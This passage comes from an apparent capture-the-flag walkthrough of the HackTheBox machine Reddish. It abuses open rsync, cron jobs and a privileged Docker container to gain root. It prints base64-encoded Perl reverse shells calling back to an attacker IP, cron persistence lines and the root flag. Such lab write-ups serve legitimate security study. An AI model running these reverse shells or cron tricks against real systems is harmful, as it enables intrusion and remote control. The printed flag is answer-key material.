<h2 id="backup-Container"><a href="#backup-Container" class="headerlink" title="backup Container"></a>backup Container</h2><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>The backup script not only provides a path to root on www, but it also tells me about another host, backup. If I ping -c 1 backup, I’ll see it resolves to 127.20.0.2. I’ll upload nmap to www and see what’s open:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ./nmap -p- --min-rate 5000 172.20.0.3</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2018-07-25 12:36 UTC</span><br><span class="line">Unable to find nmap-services!  Resorting to /etc/services</span><br><span class="line">Cannot find nmap-payloads. UDP payloads are disabled.</span><br><span class="line">Nmap scan report <span class="keyword">for</span> reddish_composition_backup_1.reddish_composition_internal-network-2 (172.20.0.2)</span><br><span class="line">Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed</span><br><span class="line">Host is up (0.000034s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">873/tcp open  rsync</span><br><span class="line">MAC Address: 02:42:AC:14:00:02 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 22.23 seconds</span><br></pre></td></tr></table></figure>

<p>open on 873, rsync, which is how www was connecting to it.</p>
<p>I’ll update my diagram:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb55.jpg"></li>
</ul>
<h3 id="rsync-access"><a href="#rsync-access" class="headerlink" title="rsync access"></a>rsync access</h3><p>rsync gives me full read and write access to backup. I can read the file system:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rsync rsync://backup:873/src</span></span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:39 .</span><br><span class="line">-rwxr-xr-x              0 2018/05/04 21:01:30 .dockerenv</span><br><span class="line">-rwxr-xr-x            100 2018/05/04 19:55:07 docker-entrypoint.sh</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:41 backup</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:39 bin</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:38 boot</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:39 data</span><br><span class="line">drwxr-xr-x          3,720 2020/07/25 14:50:42 dev</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:39 etc</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:38 home</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:39 lib</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:38 lib64</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:38 media</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:38 mnt</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:38 opt</span><br><span class="line">dr-xr-xr-x              0 2020/07/25 14:50:42 proc</span><br><span class="line">drwxr-xr-x          4,096 2020/07/25 20:16:01 rdb</span><br><span class="line">drwx------          4,096 2018/07/15 17:42:38 root</span><br><span class="line">drwxr-xr-x          4,096 2020/07/25 14:50:43 run</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:38 sbin</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:38 srv</span><br><span class="line">dr-xr-xr-x              0 2020/07/25 14:50:42 sys</span><br><span class="line">drwxrwxrwt          4,096 2020/07/25 21:18:01 tmp</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:39 usr</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:39 var</span><br></pre></td></tr></table></figure>

<p>I can write to the file system:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rsync rsync://backup:873/src/tmp/</span></span><br><span class="line">drwxrwxrwt          4,096 2018/07/26 21:27:16 .</span><br><span class="line"><span class="comment"># rsync luci rsync://backup:873/src/tmp/</span></span><br><span class="line"><span class="comment"># rsync rsync://backup:873/src/tmp/</span></span><br><span class="line">drwxrwxrwt          4,096 2018/07/26 21:27:34 .</span><br><span class="line">-rw-r--r--              0 2018/07/26 21:27:34 luci</span><br></pre></td></tr></table></figure>

<h3 id="Shell-via-Cron"><a href="#Shell-via-Cron" class="headerlink" title="Shell via Cron"></a>Shell via Cron</h3><p>I’ll use the read &#x2F; write access to verify that cron is enabled, and then write one to get shell.<br>There’s already a cron named clean in the folder, which is a good sign that cron is enabled:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rsync rsync://backup:873/src/etc/cron.d/</span></span><br><span class="line">drwxr-xr-x          4,096 2018/07/25 21:41:13 .</span><br><span class="line">-rw-r--r--            102 2015/06/11 10:23:47 .placeholder</span><br><span class="line">-rw-r--r--             29 2018/05/04 20:57:55 clean</span><br></pre></td></tr></table></figure>

<p>I’ll write a cron file. First, a shell script that calls back to www on port 9010:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTcyLjIwLjAuMiI7JHA9OTAxMDtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsnCg== | base64 -d &gt; shell.sh</span></span><br><span class="line"><span class="comment"># cat shell.sh</span></span><br><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;172.20.0.2&quot;;$p=9010;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br><span class="line"><span class="comment"># rsync -a shell.sh rsync://backup:873/src/tmp/</span></span><br><span class="line"><span class="comment"># rsync rsync://backup:873/src/tmp/</span></span><br><span class="line">drwxrwxrwt          4,096 2020/07/25 21:33:31 .</span><br><span class="line">-rw-r--r--              0 2020/07/25 21:24:23 luci</span><br><span class="line">-rw-r--r--            220 2020/07/25 21:33:08 shell.sh</span><br></pre></td></tr></table></figure>

<p>Now write the cron:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># echo &#x27;* * * * * root sh /tmp/shell.sh&#x27; &gt; shell</span></span><br><span class="line"><span class="comment"># rsync -a shell rsync://backup:873/src/etc/cron.d/</span></span><br></pre></td></tr></table></figure>

<p>Rather than tunnel everything thing back to kali, I’ll just use socat to listen on www in this case. That gets me a callback as root on backup:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /socat TCP-LISTEN:9010 STDOUT</span></span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string"># hostname</span></span><br><span class="line"><span class="string">backup</span></span><br></pre></td></tr></table></figure>

<h2 id="reddish-Host"><a href="#reddish-Host" class="headerlink" title="reddish Host"></a>reddish Host</h2><h3 id="File-System-Access"><a href="#File-System-Access" class="headerlink" title="File System Access"></a>File System Access</h3><p>backup is rather bare, other than the information I already had. However, one of the mis-configurations that can come with docker is running with –privileged. There’s some detail on slide 20 <span class="exturl" data-url="aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvQm9yZ0hhbi9oYWNraW5nLWRvY2tlci10aGUtZWFzeS13YXk=">here<i class="fa fa-external-link-alt"></i></span>. That flag provides access to the raw devices in &#x2F;dev on the host.</p>
<p>on backup, I see a lot more, including the disks:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ls /dev</span></span><br><span class="line">...</span><br><span class="line">psaux</span><br><span class="line">ptmx</span><br><span class="line">pts</span><br><span class="line">random</span><br><span class="line">rfkill</span><br><span class="line">rtc0</span><br><span class="line">sda</span><br><span class="line">sda1</span><br><span class="line">sda2</span><br><span class="line">sda3</span><br><span class="line">sda4</span><br><span class="line">sda5</span><br><span class="line">sg0</span><br><span class="line">sg1</span><br><span class="line">shm</span><br><span class="line">snapshot</span><br><span class="line">snd</span><br><span class="line">sr0</span><br><span class="line">stderr</span><br><span class="line">stdin</span><br><span class="line">stdout</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>This raw device access is enough to provide file system access:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mount /dev/sda1 /mnt</span></span><br><span class="line"><span class="comment"># ls /mnt/root</span></span><br><span class="line">root.txt</span><br></pre></td></tr></table></figure>

<p>grab the flag:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /mnt/root/root.txt</span></span><br><span class="line">50d0db644c8d5ff5312ef3d17c2ed205</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb56.jpg"></li>
</ul>
<h3 id="root-Shell"><a href="#root-Shell" class="headerlink" title="root Shell"></a>root Shell</h3><p>With write access to &#x2F;etc&#x2F;cron.d, I can get a root shell easily. And, reddish can talk directly home, so I don’t have to make tunnels, which is nice. Write a shell script:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTAuMTAuMTQuOSI7JHA9OTAxMDtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsnCg== | base64 -d &gt; shell.sh</span></span><br><span class="line"><span class="comment"># cat /mnt/opt/shell.sh</span></span><br><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;10.10.14.9&quot;;$p=9010;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>Now write the cron:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cd /mnt/etc/cron.d/</span></span><br><span class="line"><span class="comment"># echo &#x27;* * * * * root sh /opt/shell.sh&#x27; &gt; shell</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">mdadm</span><br><span class="line">popularity-contest</span><br><span class="line">shell</span><br></pre></td></tr></table></figure>

<p>Catch the callback:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 9010</span></span><br><span class="line">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9010</span><br><span class="line">Ncat: Listening on 0.0.0.0:9010</span><br><span class="line">Ncat: Connection from 10.10.10.94.</span><br><span class="line">Ncat: Connection from 10.10.10.94:35526.</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string"># ls</span></span><br><span class="line"><span class="string">root.txt</span></span><br><span class="line"><span class="string"># ifconfig</span></span><br><span class="line"><span class="string">/bin/sh: 4: ifconfig: not found</span></span><br><span class="line"><span class="string"># ip addr</span></span><br><span class="line"><span class="string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span></span><br><span class="line"><span class="string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span></span><br><span class="line"><span class="string">    inet 127.0.0.1/8 scope host lo</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span></span><br><span class="line"><span class="string">    link/ether 00:50:56:b9:ef:a7 brd ff:ff:ff:ff:ff:ff</span></span><br><span class="line"><span class="string">    inet 10.10.10.94/24 brd 10.10.10.255 scope global ens33</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">3: br-81dc9e600be9: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span></span><br><span class="line"><span class="string">    link/ether 02:42:fe:5f:02:1f brd ff:ff:ff:ff:ff:ff</span></span><br><span class="line"><span class="string">    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-81dc9e600be9</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">4: br-91c5803ee070: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span></span><br><span class="line"><span class="string">    link/ether 02:42:7e:9a:4c:f3 brd ff:ff:ff:ff:ff:ff</span></span><br><span class="line"><span class="string">    inet 172.20.0.1/16 brd 172.20.255.255 scope global br-91c5803ee070</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">5: br-d4a52cd704d0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span></span><br><span class="line"><span class="string">    link/ether 02:42:71:03:1d:13 brd ff:ff:ff:ff:ff:ff</span></span><br><span class="line"><span class="string">    inet 172.19.0.1/16 brd 172.19.255.255 scope global br-d4a52cd704d0</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">6: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default </span></span><br><span class="line"><span class="string">    link/ether 02:42:47:f2:fd:fd brd ff:ff:ff:ff:ff:ff</span></span><br><span class="line"><span class="string">    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">8: vethff25d9b@if7: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-d4a52cd704d0 state UP group default </span></span><br><span class="line"><span class="string">    link/ether 5e:d0:0b:6f:0d:6f brd ff:ff:ff:ff:ff:ff link-netnsid 3</span></span><br><span class="line"><span class="string">10: veth2f1092e@if9: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-81dc9e600be9 state UP group default </span></span><br><span class="line"><span class="string">    link/ether 6a:7e:bc:f7:0d:2e brd ff:ff:ff:ff:ff:ff link-netnsid 3</span></span><br><span class="line"><span class="string">12: veth4ff04ec@if11: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-d4a52cd704d0 state UP group default </span></span><br><span class="line"><span class="string">    link/ether 32:d6:19:ae:75:e5 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span></span><br><span class="line"><span class="string">14: veth2349c18@if13: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-91c5803ee070 state UP group default </span></span><br><span class="line"><span class="string">    link/ether 06:9f:60:e4:c1:cd brd ff:ff:ff:ff:ff:ff link-netnsid 0</span></span><br><span class="line"><span class="string">16: veth3bff539@if15: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-91c5803ee070 state UP group default </span></span><br><span class="line"><span class="string">    link/ether 9a:c4:04:69:cd:5a brd ff:ff:ff:ff:ff:ff link-netnsid 2</span></span><br><span class="line"><span class="string">18: veth01eea77@if17: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-d4a52cd704d0 state UP group default </span></span><br><span class="line"><span class="string">    link/ether d2:d8:e2:80:45:09 brd ff:ff:ff:ff:ff:ff link-netnsid 1</span></span><br><span class="line"><span class="string">19: virbr0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default qlen 1000</span></span><br><span class="line"><span class="string">    link/ether 52:54:00:a8:fd:d5 brd ff:ff:ff:ff:ff:ff</span></span><br><span class="line"><span class="string">    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">20: virbr0-nic: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc pfifo_fast master virbr0 state DOWN group default qlen 1000</span></span><br><span class="line"><span class="string">    link/ether 52:54:00:a8:fd:d5 brd ff:ff:ff:ff:ff:ff</span></span><br></pre></td></tr></table></figure>

<p>what a great and complicated box!</p>
<h2 id="Beyond-Root"><a href="#Beyond-Root" class="headerlink" title="Beyond Root"></a>Beyond Root</h2><h3 id="Docker-Configuration"><a href="#Docker-Configuration" class="headerlink" title="Docker Configuration"></a>Docker Configuration</h3><p>Once I have root, I like to go back and look at how things were configured. In this case, the docker configuration is interesting.</p>
<p>The docker configuration files are stored in &#x2F;opt&#x2F;reddish_composition&#x2F;:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cd /opt/reddish_composition/</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">apache</span><br><span class="line">docker-compose.yml</span><br><span class="line">multi-nodered</span><br><span class="line">redis</span><br><span class="line">rsync</span><br><span class="line">www</span><br></pre></td></tr></table></figure>

<p>docker-compose.yml shows how the machines are run, including the shared volume between redis and www, how the networks are laid out, and that backup is running in privileged mode (&lt;– comments added by me):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat docker-compose.yml</span></span><br><span class="line">version: <span class="string">&#x27;3&#x27;</span></span><br><span class="line">services:</span><br><span class="line">  nodered:</span><br><span class="line">    build: ./multi-nodered</span><br><span class="line">    hostname: nodered</span><br><span class="line">    ports:</span><br><span class="line">     - <span class="string">&quot;1880:1880&quot;</span></span><br><span class="line">    networks:</span><br><span class="line">      - default</span><br><span class="line">      - internal-network</span><br><span class="line">    restart: always</span><br><span class="line">  redis:</span><br><span class="line">    build: ./redis</span><br><span class="line">    hostname: redis</span><br><span class="line">    volumes:</span><br><span class="line">     - ./www:/var/www/html</span><br><span class="line">    networks:</span><br><span class="line">     - internal-network</span><br><span class="line">    restart: always</span><br><span class="line">  www:</span><br><span class="line">    build: ./apache</span><br><span class="line">    hostname: www</span><br><span class="line">    volumes:</span><br><span class="line">     - ./www:/var/www/html</span><br><span class="line">     - /home:/home</span><br><span class="line">    networks:</span><br><span class="line">     - internal-network</span><br><span class="line">     - internal-network-2</span><br><span class="line">    restart: always</span><br><span class="line">  backup:</span><br><span class="line">    build: ./rsync</span><br><span class="line">    hostname: backup</span><br><span class="line">    volumes:</span><br><span class="line">     - ./rsync/www:/backup</span><br><span class="line">    networks:</span><br><span class="line">     - internal-network-2</span><br><span class="line">    restart: always</span><br><span class="line">    privileged: <span class="literal">true</span></span><br><span class="line">networks:</span><br><span class="line">  internal-network:</span><br><span class="line">   internal: <span class="literal">true</span></span><br><span class="line">  internal-network-2:</span><br><span class="line">   internal: <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>update picture of the docker network one last time:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb57.jpg"></li>
</ul>
<h3 id="Node-Red-Collisions"><a href="#Node-Red-Collisions" class="headerlink" title="Node-Red Collisions"></a>Node-Red Collisions</h3><p>When I first visit the node red site, what’s to keep me from running into other people and their flows? And, what was with the need to issue a POST request to get the url to the site? Turns out, those are related.</p>
<p>The code that’s running the NodeRed instance is in &#x2F;node-red&#x2F;multinodered.js:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /opt/reddish_composition/multi-nodered/nodered/multinodered.js</span></span><br><span class="line">var http = require(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line">var express = require(<span class="string">&quot;express&quot;</span>);</span><br><span class="line">var crypto = require(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line"></span><br><span class="line">var id_list = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> createNodeREDInstance(server, app, ip) &#123;</span><br><span class="line"></span><br><span class="line">    var <span class="built_in">id</span> = crypto.createHash(<span class="string">&#x27;md5&#x27;</span>).update(ip).digest(<span class="string">&quot;hex&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (id_list.indexOf(<span class="built_in">id</span>) &gt; -1) &#123;</span><br><span class="line">        console.log(<span class="string">&quot;Instance already running:&quot;</span>, <span class="built_in">id</span>);</span><br><span class="line">        <span class="built_in">return</span> <span class="built_in">id</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    var RED = require(<span class="string">&quot;./red/red.js&quot;</span>)();</span><br><span class="line">    //var <span class="built_in">id</span> = crypto.randomBytes(16).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    console.log(<span class="string">&quot;Creating new instance:&quot;</span>, <span class="built_in">id</span>);</span><br><span class="line"></span><br><span class="line">    // Create the settings object - see default settings.js file <span class="keyword">for</span> other options</span><br><span class="line">    var settings = &#123;</span><br><span class="line">        httpAdminRoot:<span class="string">&quot;/red/&quot;</span>+<span class="built_in">id</span>,</span><br><span class="line">        httpNodeRoot: <span class="string">&quot;/api/&quot;</span>+<span class="built_in">id</span>,</span><br><span class="line">        userDir:<span class="string">&quot;./home/&quot;</span>+<span class="built_in">id</span>,</span><br><span class="line">        functionGlobalContext: &#123; &#125;    // enables global context</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    RED.init(server, settings);</span><br><span class="line"></span><br><span class="line">    // Serve the editor UI from /red</span><br><span class="line">    app.use(settings.httpAdminRoot, RED.httpAdmin);</span><br><span class="line"></span><br><span class="line">    